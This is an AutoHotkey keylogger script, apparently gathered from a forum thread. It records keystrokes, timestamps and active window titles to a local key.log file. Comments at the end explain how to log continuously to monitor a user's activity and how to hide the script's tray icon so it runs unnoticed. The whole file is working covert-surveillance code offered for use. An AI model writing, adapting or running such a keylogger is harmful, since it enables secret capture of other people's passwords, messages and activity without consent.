;https://autohotkey.com/board/topic/73858-looking-for-efficient-key-logger-script/
;Keylogger that also records page title and time.
;https://www.youtube.com/watch?v=xurcJgtO8Pw

;~ SetBatchLines,-1
Loop {                                              
  Input, k, V T5 ;saves key input within a 5 second window into k | add B to ignore backspace input | add M to recognise ctrl + key combo
  FormatTime, t, , MM-dd-yyyy hh:mm:ss tt ; save current timestamp into t
  WinGetActiveTitle, pt ;save active window title to pt (window title placeholder 1)
  pttk = `n`n`n****************`n%pt%`n%t%`n`n%k%   ; defines variable pttk: page title, time, keys logged
  k:= (pt!=pt2) ? pttk : k ;if pt does not equal pt2 (then assign pttk to k otherwise assign k to k (do nothing)
  FileAppend, %k% , key.log ;save the keys within the window into the log file
  pt2 := pt ;set window title placeholder 2 to the value in window title placeholder 1
}

;the above script as it stands only creates a new header (i.e. pttk) if you switch the active window
;if you want a log every 5 seconds then comment out line 10 (the ternary operator) and change %k% in FileAppend command to %pttk%
;that way you can also monitor user's active window at every interval
;add #NoTrayIcon to hide the AHK icon in the tray